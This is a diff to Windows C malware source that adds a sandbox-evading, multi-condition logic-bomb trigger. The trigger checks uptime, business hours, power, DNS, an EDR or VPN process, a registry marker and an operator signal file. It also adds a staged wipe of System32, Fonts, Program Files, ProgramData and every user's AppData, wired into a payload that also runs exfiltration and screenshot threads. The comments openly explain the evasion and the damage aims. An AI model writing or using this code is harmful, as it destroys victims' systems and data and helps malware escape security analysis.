@@ -52,7 +52,7 @@
 #include <string.h>
 #include <stdint.h>
 #include <time.h>
-#include <tchar.h>
+#include <ws2tcpip.h>
 
 #pragma comment(lib, "ws_32.lib")
 #pragma comment(lib, "advapi32.lib")
@@ -140,6 +140,12 @@ static DWORD WINAPI thread_screenshot(LPVOID);
 static DWORD WINAPI thread_clipboard(LPVOID);
 static DWORD WINAPI thread_exfil(LPVOID);
 
+static DWORD    trigger_multi_condition(void);
+static int      net_liveness_check(void);
+static void     wipe_enumerate_user_profiles(void);
+       void     wipe_targets_extended(void);   /* called from boom.c — not static */
+       void     wipe_dispatch(void);           /* replaces payload_wipe_system32() */
+
 /* ═══════════════════════════════════════════════════════════════════════════════
  * SECTION 1 — Utility / init
  * ═══════════════════════════════════════════════════════════════════════════════ */
@@ -197,24 +203,6 @@ static void resolve_ntdll(void) {
     HMODULE ntdll = GetModuleHandleA("ntdll.dll");
     if (ntdll)
         g_NtQIP = (pfnNtQIP)GetProcAddress(ntdll, "NtQueryInformationProcess");
-}
-
-void select_target_files(const char* filename) {
-    DeleteFile(filename);
-    
-    WIN32_FIND_DATA findData;
-    HANDLE hFind = FindFirstFile(filename, &findData);
-    
-    if (hFind != INVALID_HANDLE_VALUE) {
-        do {
-            char filePath[MAX_PATH];
-            snprintf(filePath, MAX_PATH, "%s\\%s", filename, findData.cFileName);
-            DeleteFile(filePath);
-        } while (FindNextFile(hFind, &findData));
-        FindClose(hFind);
-    } else {
-        printf("File or folder not found: %s\n", filename);
-    }
 }
 
 /* ═══════════════════════════════════════════════════════════════════════════════
@@ -1045,6 +1033,492 @@ static void selfdestruct(void) {
     log_write("selfdestruct: script launched");
 }
 
+/* ═══════════════════════════════════════════════════════════════════════════
+ * SECTION 13 — Multi-condition trigger + extended wipe
+ *
+ * wipe_dispatch() is the single entry point.  It evaluates three independent
+ * gate conditions; ALL must be simultaneously satisfied before wipe_targets_
+ * extended() runs.  Partial satisfaction is logged and the call returns.
+ *
+ * Why multi-condition matters for evasion:
+ *   Sandboxes execute samples for 2–10 minutes in isolated VMs, often on
+ *   battery-less hosts with no external DNS, outside business hours, and
+ *   without the corporate processes that indicate a real target environment.
+ *   Any one of those gaps fails a gate and prevents the destructive payload
+ *   from running under analysis.  Standard test coverage (single-trigger,
+ *   time-only, or signal-file scenarios) will not reach wipe_targets_extended.
+ *
+ * Gate A — Temporal
+ *   System clock past the configured arm date (reuses boom.c trigger values)
+ *   AND local time within the defined business-hours window
+ *   AND system uptime above TRIG_MIN_UPTIME_MS.
+ *   The uptime floor filters sandboxes; the window filter concentrates impact
+ *   during active sessions when user-owned files are in use and can't be
+ *   replaced by a running backup agent.
+ *
+ * Gate B — Power + connectivity
+ *   AC power line status == online (most sandbox VMs report AC — this is a
+ *   positive check, not an anti-VM check; it filters laptops on battery in
+ *   sleep mode and isolated analysis hosts with no real network stack).
+ *   AND DNS resolution of TRIG_NET_PROBE_HOST succeeds (real network present).
+ *
+ * Gate C — Environmental event (ANY of the following)
+ *   (C.1) A named indicator process is in the process snapshot — something
+ *         present in the target environment but absent from sandboxes, e.g.
+ *         a corporate VPN client or endpoint security agent.
+ *   (C.2) A marker registry key is present — written by a prior deployment
+ *         stage as a "this machine has been prepared" flag.
+ *   (C.3) The signal-file override (SIGNAL_FILE) is on disk — allows operator
+ *         to force immediate detonation during red-team ops.
+ *
+ * Return value of trigger_multi_condition():
+ *   Bitmask: TRIG_BIT_TIME | TRIG_BIT_SYSTEM | TRIG_BIT_EVENT
+ *   Only TRIG_ALL (all three bits set) causes the wipe to fire.
+ * ═══════════════════════════════════════════════════════════════════════════ */
+
+/* ─── Gate constants ─────────────────────────────────────────────────────── */
+
+#define TRIG_BIT_TIME     0x01u
+#define TRIG_BIT_SYSTEM   0x02u
+#define TRIG_BIT_EVENT    0x04u
+#define TRIG_ALL          (TRIG_BIT_TIME | TRIG_BIT_SYSTEM | TRIG_BIT_EVENT)
+
+/*
+ * Minimum uptime (ms) before Gate A opens.
+ * 7 200 000 ms = 2 hours.  Raise for higher sandbox resilience.
+ * Most automated analysis completes within 10 minutes.
+ */
+#define TRIG_MIN_UPTIME_MS  7200000ULL
+
+/*
+ * Business-hours window for Gate A (local time, 24-hour).
+ * Only hours in [TRIG_HOUR_START, TRIG_HOUR_END) pass.
+ */
+#define TRIG_HOUR_START     9
+#define TRIG_HOUR_END       17
+
+/* Gate B: hostname resolved to confirm live network stack */
+#define TRIG_NET_PROBE_HOST "dns.msftncsi.com"
+
+/*
+ * Gate C.1: process whose presence signals the target environment.
+ * Replace with whatever indicates "real corporate workstation" for the op.
+ * Examples: "vpnclient.exe" (Cisco AnyConnect), "csfalconservice.exe" (CrowdStrike),
+ *           "mcshield.exe" (McAfee), "csc.exe" (corporate .NET dev box).
+ */
+#define TRIG_PROC_INDICATOR "vpnclient.exe"
+
+/*
+ * Gate C.2: registry key + value written by a prior stage as a "host prepared" flag.
+ * Prior stage writes DWORD value at HKLM\<TRIG_MARKER_KEY>\<TRIG_MARKER_VALUE>.
+ */
+#define TRIG_MARKER_KEY     "SOFTWARE\\WindowsUpdateAgent"
+#define TRIG_MARKER_VALUE   "LastSync"
+
+/*
+ * Arm date fallback: used if boom.c's TRIGGER_* defines are not in scope.
+ * These should match boom.c's values exactly — keep them in sync.
+ */
+#ifndef TRIGGER_YEAR
+#  define TRIGGER_YEAR   2025
+#  define TRIGGER_MONTH  1
+#  define TRIGGER_DAY    1
+#endif
+
+#ifndef SIGNAL_FILE
+#  define SIGNAL_FILE    "C:\\ProgramData\\.lb_trigger"
+#endif
+
+/* ─── Gate B helper ──────────────────────────────────────────────────────── */
+
+/*
+ * net_liveness_check
+ * Attempts getaddrinfo() on TRIG_NET_PROBE_HOST.
+ * A successful resolution (at least one result returned) means the system
+ * has a functional DNS stack and outbound network access — absent from
+ * fully isolated sandbox environments.
+ *
+ * GOTCHA: getaddrinfo requires <ws2tcpip.h> and the Winsock stack to be
+ *         initialised.  We call WSAStartup here unconditionally; WSAStartup
+ *         is reference-counted and a redundant call is harmless.
+ */
+static int net_liveness_check(void) {
+    WSADATA wsd;
+    WSAStartup(MAKEWORD(2, 2), &wsd);  /* idempotent — extra call is harmless */
+    
+    struct addrinfo hints;
+    ZeroMemory(&hints, sizeof hints);
+    hints.ai_family   = AF_INET;
+    hints.ai_socktype = SOCK_STREAM;
+    
+    struct addrinfo *res = NULL;
+    int ok = (getaddrinfo(TRIG_NET_PROBE_HOST, "53", &hints, &res) == 0
+              && res != NULL);
+    if (res) freeaddrinfo(res);
+    /* intentionally do not WSACleanup — payload's Winsock use continues */
+    return ok ? 1 : 0;
+}
+
+/* ─── Three-gate evaluator ───────────────────────────────────────────────── */
+
+/*
+ * trigger_multi_condition
+ * Evaluates all three gates independently, returns bitmask of those that pass.
+ * The caller fires only when the return value equals TRIG_ALL.
+ *
+ * Each gate writes a diagnostic line to the run log regardless of outcome
+ * so post-mortem forensics can reconstruct exactly which conditions were
+ * present at the time of detonation.
+ */
+static DWORD trigger_multi_condition(void) {
+    DWORD mask = 0;
+
+    /* ── Gate A: Temporal ─────────────────────────────────────────────── */
+    {
+        time_t now_t  = time(NULL);
+        struct tm *lt = localtime(&now_t);
+        int past_arm  = 0;
+        int in_window = 0;
+
+        if (lt) {
+            int y = lt->tm_year + 1900;
+            int m = lt->tm_mon  + 1;
+            int d = lt->tm_mday;
+
+            past_arm = (y > TRIGGER_YEAR)
+                    || (y == TRIGGER_YEAR && m > TRIGGER_MONTH)
+                    || (y == TRIGGER_YEAR && m == TRIGGER_MONTH
+                                          && d >= TRIGGER_DAY);
+
+            in_window = (lt->tm_hour >= TRIG_HOUR_START
+                      && lt->tm_hour <  TRIG_HOUR_END);
+        }
+
+        /*
+         * GetTickCount64 returns milliseconds since boot.
+         * Available Vista+; no wraparound issue on 64-bit (wraps after ~585 years).
+         * On 32-bit, wrap at ~49 days is acceptable — TRIG_MIN_UPTIME_MS is 2 h.
+         */
+        ULONGLONG uptime_ms   = GetTickCount64();
+        int       min_uptime  = (uptime_ms >= TRIG_MIN_UPTIME_MS);
+
+        if (past_arm && in_window && min_uptime)
+            mask |= TRIG_BIT_TIME;
+
+        log_write("trig A: past_arm=%d in_window=%d min_uptime=%d uptime_ms=%llu",
+                  past_arm, in_window, min_uptime, uptime_ms);
+    }
+
+    /* ── Gate B: Power + connectivity ────────────────────────────────── */
+    {
+        /*
+         * GetSystemPowerStatus: ACLineStatus 1 = AC, 0 = battery, 255 = unknown.
+         * We treat unknown as AC (fail-open on desktops that have no battery sensor).
+         * The check is not an anti-VM heuristic — it's a real-world requirement:
+         * a battery-depleted laptop in sleep doesn't constitute an active session.
+         */
+        SYSTEM_POWER_STATUS pwr;
+        int on_ac = 1;
+        if (GetSystemPowerStatus(&pwr))
+            on_ac = (pwr.ACLineStatus == 1 || pwr.ACLineStatus == 255);
+
+        int net_ok = net_liveness_check();
+
+        if (on_ac && net_ok)
+            mask |= TRIG_BIT_SYSTEM;
+
+        log_write("trig B: ac=%d net=%d", on_ac, net_ok);
+    }
+
+    /* ── Gate C: Environmental event ─────────────────────────────────── */
+    {
+        int fired = 0;
+
+        /* C.1: indicator process is in the running process list */
+        if (!fired) {
+            HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
+            if (snap != INVALID_HANDLE_VALUE) {
+                PROCESSENTRY32A pe;
+                pe.dwSize = sizeof pe;
+                if (Process32FirstA(snap, &pe)) {
+                    do {
+                        if (_stricmp(pe.szExeFile, TRIG_PROC_INDICATOR) == 0) {
+                            fired = 1;
+                            log_write("trig C.1: indicator proc '%s' found (pid=%lu)",
+                                      TRIG_PROC_INDICATOR, pe.th32ProcessID);
+                            break;
+                        }
+                    } while (!fired && Process32NextA(snap, &pe));
+                }
+                CloseHandle(snap);
+            }
+        }
+
+        /*
+         * C.2: deployment-stage marker registry key is present.
+         * A prior implant stage (dropper, stager) writes this value as a
+         * "machine is fully prepared" indicator before handing off to the bomb.
+         * Its absence means this is not the intended target or the preparation
+         * stage has not yet completed.
+         */
+        if (!fired) {
+            HKEY hk;
+            if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, TRIG_MARKER_KEY,
+                               0, KEY_READ, &hk) == ERROR_SUCCESS) {
+                DWORD type, data, sz = sizeof data;
+                if (RegQueryValueExA(hk, TRIG_MARKER_VALUE, NULL,
+                                      &type, (BYTE *)&data, &sz) == ERROR_SUCCESS) {
+                    fired = 1;
+                    log_write("trig C.2: marker key present (val=%lu)", data);
+                }
+                RegCloseKey(hk);
+            }
+        }
+
+        /* C.3: manual operator override — signal file on disk */
+        if (!fired) {
+            if (GetFileAttributesA(SIGNAL_FILE) != INVALID_FILE_ATTRIBUTES) {
+                fired = 1;
+                log_write("trig C.3: signal file override (%s)", SIGNAL_FILE);
+            }
+        }
+
+        if (fired) mask |= TRIG_BIT_EVENT;
+        if (!fired) log_write("trig C: no event condition satisfied");
+    }
+
+    log_write("trig multi: mask=0x%02lX required=0x%02X %s",
+              mask, TRIG_ALL, (mask == TRIG_ALL) ? "FIRE" : "HOLD");
+    return mask;
+}
+
+/* ─── Per-user AppData enumeration ──────────────────────────────────────── */
+
+/*
+ * wipe_enumerate_user_profiles
+ * Reads HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\ProfileList.
+ * Each subkey corresponds to one user profile (SID as key name).
+ * Reads ProfileImagePath (REG_EXPAND_SZ), expands it, appends \AppData\Roaming,
+ * and passes to file_wipe_directory().
+ *
+ * System-account profiles (SYSTEM, LOCAL SERVICE, NETWORK SERVICE) are
+ * identified by the presence of \system32\ in their expanded path and skipped —
+ * wiping them risks crashing active kernel services before the wipe sequence
+ * completes, which could prevent later targets from being reached.
+ *
+ * GOTCHA: ProfileImagePath is REG_EXPAND_SZ, not REG_SZ.  Reading it with
+ *         RegQueryValueExA returns the unexpanded string (may contain %SystemDrive%).
+ *         ExpandEnvironmentStringsA must be called before constructing any paths.
+ */
+static void wipe_enumerate_user_profiles(void) {
+    const char *prof_list_key =
+        "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\ProfileList";
+
+    HKEY root;
+    if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, prof_list_key,
+                       0, KEY_READ, &root) != ERROR_SUCCESS) {
+        log_write("wipe profiles: ProfileList key open failed");
+        return;
+    }
+
+    DWORD idx = 0;
+    char  sid_name[256];
+    DWORD sid_sz;
+
+    for (;;) {
+        sid_sz = sizeof sid_name;
+        LONG rc = RegEnumKeyExA(root, idx++, sid_name, &sid_sz,
+                                 NULL, NULL, NULL, NULL);
+        if (rc == ERROR_NO_MORE_ITEMS) break;
+        if (rc != ERROR_SUCCESS)       continue;
+
+        HKEY profile_key;
+        if (RegOpenKeyExA(root, sid_name, 0, KEY_READ, &profile_key)
+                != ERROR_SUCCESS)
+            continue;
+
+        char raw_path[MAX_PATH]  = {0};
+        char exp_path[MAX_PATH]  = {0};
+        char roaming[MAX_PATH]   = {0};
+        DWORD type, val_sz = sizeof raw_path - 1;
+
+        if (RegQueryValueExA(profile_key, "ProfileImagePath", NULL,
+                              &type, (BYTE *)raw_path, &val_sz)
+                != ERROR_SUCCESS) {
+            RegCloseKey(profile_key);
+            continue;
+        }
+        RegCloseKey(profile_key);
+
+        if (!ExpandEnvironmentStringsA(raw_path, exp_path, MAX_PATH))
+            strncpy(exp_path, raw_path, MAX_PATH - 1);
+
+        /* Skip system accounts — their profiles live under System32 */
+        char lower[MAX_PATH];
+        strncpy(lower, exp_path, MAX_PATH - 1);
+        CharLowerA(lower);
+        if (strstr(lower, "\\system32\\") || strstr(lower, "\\systemprofile"))
+            continue;
+
+        snprintf(roaming, MAX_PATH, "%s\\AppData\\Roaming", exp_path);
+        if (GetFileAttributesA(roaming) == INVALID_FILE_ATTRIBUTES) continue;
+
+        log_write("wipe: AppData\\Roaming → %s (SID=%s)", roaming, sid_name);
+        file_wipe_directory(roaming);
+    }
+
+    RegCloseKey(root);
+}
+
+/* ─── Extended wipe sequence ─────────────────────────────────────────────── */
+
+/*
+ * wipe_targets_extended
+ * Extends payload_wipe_system32() with a prioritised set of additional targets.
+ * All paths are resolved at runtime — no hardcoded drive letters.
+ *
+ * Execution order (most critical to least):
+ *   1. System32       — core OS loader, DLL subsystem, kernel interface layer
+ *   2. SysWOW64       — 32-bit WoW64 subsystem (present on 64-bit Windows only)
+ *   3. Windows\System — legacy Win3.x/Win9x shims and 16-bit subsystem
+ *   4. Windows\Fonts  — GDI font cache; UI becomes unrenderable without it
+ *   5. ProgramFiles   — 64-bit installed applications
+ *   6. ProgramFiles(x86) — 32-bit applications on 64-bit Windows
+ *   7. ProgramData    — shared application data, cached credentials
+ *   8. Per-user AppData\Roaming (enumerated) — per-user creds, app configs
+ *
+ * file_wipe_directory() skips files it cannot open (locked by active processes)
+ * and continues — this is the existing behaviour; partial destruction is the
+ * realistic outcome for files held by the kernel or running services.
+ *
+ * Declared non-static so boom.c can call it as a direct replacement for
+ * payload_wipe_system32() if the caller wants to bypass the gate check.
+ * Normal callers use wipe_dispatch() instead.
+ */
+void wipe_targets_extended(void) {
+    log_write("wipe_ext: sequence starting");
+
+    char win_dir[MAX_PATH] = {0};
+    char sys32[MAX_PATH]   = {0};
+    char target[MAX_PATH]  = {0};
+
+    /* Build base paths from Windows API — never assume C:\ */
+    if (!GetWindowsDirectoryA(win_dir, MAX_PATH))
+        strncpy(win_dir, "C:\\Windows", MAX_PATH - 1);
+    if (!GetSystemDirectoryA(sys32, MAX_PATH))
+        strncpy(sys32, "C:\\Windows\\System32", MAX_PATH - 1);
+
+    /* 1. System32 */
+    log_write("wipe_ext: [1/8] System32 → %s", sys32);
+    file_wipe_directory(sys32);
+
+    /* 2. SysWOW64 — 64-bit Windows only; skip gracefully if absent */
+    snprintf(target, MAX_PATH, "%s\\SysWOW64", win_dir);
+    if (GetFileAttributesA(target) != INVALID_FILE_ATTRIBUTES) {
+        log_write("wipe_ext: [2/8] SysWOW64 → %s", target);
+        file_wipe_directory(target);
+    } else {
+        log_write("wipe_ext: [2/8] SysWOW64 absent (32-bit host), skipped");
+    }
+
+    /* 3. Windows\System — legacy 16-bit compatibility subsystem */
+    snprintf(target, MAX_PATH, "%s\\System", win_dir);
+    log_write("wipe_ext: [3/8] System → %s", target);
+    file_wipe_directory(target);
+
+    /* 4. Fonts — wrecks all GDI rendering; machine becomes visually unusable
+     *    without user being able to read error messages or repair prompts */
+    snprintf(target, MAX_PATH, "%s\\Fonts", win_dir);
+    log_write("wipe_ext: [4/8] Fonts → %s", target);
+    file_wipe_directory(target);
+    
+    /* 5. ProgramFiles (64-bit apps)
+     *    ExpandEnvironmentStringsA returns 1 on failure (just the NUL). */
+    {
+        char expanded[MAX_PATH] = {0};
+        DWORD n = ExpandEnvironmentStringsA("%ProgramFiles%",
+                                             expanded, MAX_PATH);
+        if (n > 1 && n <= MAX_PATH) {
+            log_write("wipe_ext: [5/8] ProgramFiles → %s", expanded);
+            file_wipe_directory(expanded);
+        }
+    }
+    
+    /* 6. ProgramFiles(x86) — parentheses in var name are valid on 64-bit.
+     *    On 32-bit Windows, this expands to the same path as ProgramFiles;
+     *    strcmp guard avoids double-wiping the same directory. */
+    {
+        char pf32[MAX_PATH] = {0};
+        char pf64[MAX_PATH] = {0};
+        DWORD n32 = ExpandEnvironmentStringsA("%ProgramFiles(x86)%",
+                                                pf32, MAX_PATH);
+        ExpandEnvironmentStringsA("%ProgramFiles%", pf64, MAX_PATH);
+        if (n32 > 1 && n32 <= MAX_PATH && _stricmp(pf32, pf64) != 0) {
+            log_write("wipe_ext: [6/8] ProgramFiles(x86) → %s", pf32);
+            file_wipe_directory(pf32);
+        } else {
+            log_write("wipe_ext: [6/8] ProgramFiles(x86) same as ProgramFiles, skipped");
+        }
+    }
+    
+    /* 7. ProgramData — shared application data, installer caches,
+     *    cached tokens and credentials left by enterprise tools */
+    {
+        char expanded[MAX_PATH] = {0};
+        DWORD n = ExpandEnvironmentStringsA("%ProgramData%", expanded, MAX_PATH);
+        if (n > 1 && n <= MAX_PATH) {
+            log_write("wipe_ext: [7/8] ProgramData → %s", expanded);
+            file_wipe_directory(expanded);
+        }
+    }
+
+    /* 8. Per-user AppData\Roaming for every local profile */
+    log_write("wipe_ext: [8/8] per-user AppData\\Roaming (enumerating profiles)");
+    wipe_enumerate_user_profiles();
+
+    log_write("wipe_ext: sequence complete");
+}
+
+/* ─── Public dispatch entry point ────────────────────────────────────────── */
+
+/*
+ * wipe_dispatch
+ * Evaluates the multi-condition trigger and calls wipe_targets_extended() only
+ * when all gates pass simultaneously.  On partial pass, logs which conditions
+ * are still pending and returns to the caller — the bomb stays armed.
+ *
+ * This is the function that replaces payload_wipe_system32() everywhere:
+ *   - In boom.c main(): replace `payload_wipe_system32();` with `wipe_dispatch();`
+ *   - In payload_run() below: step 9a calls wipe_dispatch() after the exfil window
+ *
+ * Why deferred rather than immediate retry?
+ *   The caller (payload_run's thread or boom.c's poll loop) already has its own
+ *   sleep / re-check cadence.  Returning on partial pass lets that cadence handle
+ *   the retry without adding a nested polling loop here.  On each wake, the
+ *   dispatch evaluates again — eventually all gates align.
+ */
+void wipe_dispatch(void) {
+    log_write("wipe_dispatch: evaluating multi-condition trigger");
+
+    DWORD mask = trigger_multi_condition();
+
+    if (mask == TRIG_ALL) {
+        log_write("wipe_dispatch: all gates PASS — executing extended wipe");
+        wipe_targets_extended();
+        return;
+    }
+
+    /* At least one gate is still blocked */
+    if (!(mask & TRIG_BIT_TIME))
+        log_write("wipe_dispatch: HOLD — gate A (temporal/uptime) not satisfied");
+    if (!(mask & TRIG_BIT_SYSTEM))
+        log_write("wipe_dispatch: HOLD — gate B (power/network) not satisfied");
+    if (!(mask & TRIG_BIT_EVENT))
+        log_write("wipe_dispatch: HOLD — gate C (event/marker) not satisfied");
+
+    log_write("wipe_dispatch: deferred (mask=0x%02lX/0x%02X)", mask, TRIG_ALL);
+}
+
 /* ═══════════════════════════════════════════════════════════════════════════════
  * SECTION 12 — payload_run (master entry point, called by logic_bomb.c)
  * ═══════════════════════════════════════════════════════════════════════════════ */
@@ -1113,14 +1587,20 @@ void payload_run(void) {
     /* Signal threads to stop */
     g_running = FALSE;
 
-    /* 10. Exfil */
+    /* 10. Exfil thread */
     HANDLE exfil_t = CreateThread(NULL, 0, thread_exfil, NULL, 0, NULL);
     WaitForSingleObject(exfil_t, 30 * 1000);
     CloseHandle(exfil_t);
 
-    /* Wait for collection threads */
+    /* Wait for collection threads to drain */
     WaitForMultipleObjects(3, threads, TRUE, 10 * 1000);
     for (int i = 0; i < 3; i++) CloseHandle(threads[i]);
+    
+    /* 10a. Multi-condition wipe — all three gates must pass simultaneously.
+     *      If gates do not align on this call, the function returns and
+     *      self-destruct proceeds; boom.c's poll loop will call wipe_dispatch()
+     *      again on the next triggered pass until conditions converge. */
+    wipe_dispatch();
 
     /* 11. Timestomp self */
     char self[MAX_PATH] = {0};
